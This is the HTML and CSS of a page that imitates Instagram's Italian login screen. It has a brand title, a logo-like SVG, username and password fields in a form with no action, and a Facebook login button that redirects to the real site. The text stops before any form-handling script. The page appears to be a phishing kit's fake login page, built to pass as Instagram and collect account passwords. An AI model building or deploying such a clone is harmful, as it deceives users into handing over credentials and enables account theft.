<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Instagram</title>
<style>
    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
    body { background-color: #FAFAFA; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; color: #262626; padding: 20px 0; }
    .login-card { background: #fff; border: 1px solid #DBDBDB; width: 100%; max-width: 350px; padding: 30px 20px; display: flex; flex-direction: column; align-items: center; }
    .logo-svg { width: 175px; margin-bottom: 20px; }
    input { background: #FAFAFA; border: 1px solid #DBDBDB; border-radius: 3px; font-size: 12px; padding: 9px 8px 7px; width: 100%; margin-bottom: 6px; color: #262626; outline: none; }
    input:focus { border: 1px solid #A8A8A8; }
    .btn { background: #0095F6; border: none; border-radius: 4px; color: #fff; font-weight: 600; font-size: 14px; padding: 7px 16px; width: 100%; margin-top: 10px; cursor: pointer; }
    .btn:disabled { opacity: 0.5; }
    .divider { position: relative; width: 100%; margin: 20px 0; text-align: center; }
    .divider::before { content: ""; position: absolute; top: 50%; left: 0; width: 100%; height: 1px; background: #DBDBDB; }
    .divider span { background: #fff; padding: 0 10px; color: #8E8E8E; font-size: 12px; position: relative; z-index: 1; }
    .fb-btn { background: #385185; border: none; border-radius: 4px; color: #fff; font-weight: 600; font-size: 14px; padding: 7px 16px; width: 100%; margin-bottom: 15px; cursor: pointer; }
    .forgot { color: #00376B; font-size: 12px; text-decoration: none; display: block; text-align: center; margin-top: 10px; }
    .signup-card { background: #fff; border: 1px solid #DBDBDB; width: 100%; max-width: 350px; padding: 20px; text-align: center; margin-top: 20px; }
    .signup-text a { color: #0095F6; text-decoration: none; font-weight: 600; }
    .footer { margin-top: 30px; font-size: 12px; color: #8E8E8E; text-align: center; }
    .footer a { color: #00376B; text-decoration: none; font-weight: 600; }
</style>
<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
</head>
<body>

<div class="login-card">
    <svg class="logo-svg" viewBox="0 0 103 29" xmlns="http://www.w3.org/2000/svg">
        <path d="M51.2 0C66.8 0 80.4 11.3 80.4 26.9S66.8 53.8 51.2 53.8 22 42.5 22 26.9 35.6 0 51.2 0zm0 11.6c-8.4 0-15.3 6.9-15.3 15.3s6.9 15.3 15.3 15.3 15.3-6.9 15.3-15.3-6.9-15.3-15.3-15.3zm0 5.8c5.2 0 9.5 4.3 9.5 9.5s-4.3 9.5-9.5 9.5-9.5-4.3-9.5-9.5 4.3-9.5 9.5-9.5z" fill="#262626"/>
        <text x="51.2" y="29" text-anchor="middle" font-family="'Grand Hotel', cursive" font-size="24" fill="#262626">Instagram</text>
    </svg>

    <form id="loginForm">
        <input type="text" id="username" placeholder="Numero di telefono, nome utente o email" autocomplete="off">
        <input type="password" id="password" placeholder="Password">
        <button type="submit" class="btn" id="submitBtn">Accedi</button>
    </form>

    <div class="divider"><span>Oppure</span></div>
    <button class="fb-btn" onclick="window.location.href='https://www.instagram.com/accounts/login/facebook/'">Accedi con Facebook</button>
    <a href="#" class="forgot">Hai dimenticato la password?</a>
</div>

<div class="signup-card">
    <div class="signup-text">Non hai un account? <a href="#">Iscriviti</a></div>
</div>

<div class="footer">
    <p style="margin-bottom: 10px;">Ottieni l'app</p>
    <a href="#">Apple Store</a> | <a href="#">Google Play</a>
</div>
